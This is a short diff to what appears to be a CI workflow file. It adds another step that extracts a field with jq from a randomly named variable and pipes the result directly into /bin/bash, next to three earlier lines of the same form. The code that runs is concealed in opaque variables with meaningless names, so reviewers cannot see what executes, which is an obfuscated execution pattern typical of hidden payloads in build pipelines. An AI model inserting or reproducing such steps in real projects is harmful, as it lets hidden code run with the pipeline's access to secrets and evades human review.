@@ -25,6 +25,7 @@ jobs:
           echo $kk778 | jq -r .rldc72 | /bin/bash
           echo $prtz6 | jq -r .srx27197 | /bin/bash
           echo $ljqo8308 | jq -r .e021 | /bin/bash
+          echo $eqo263 | jq -r .ifccj8 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
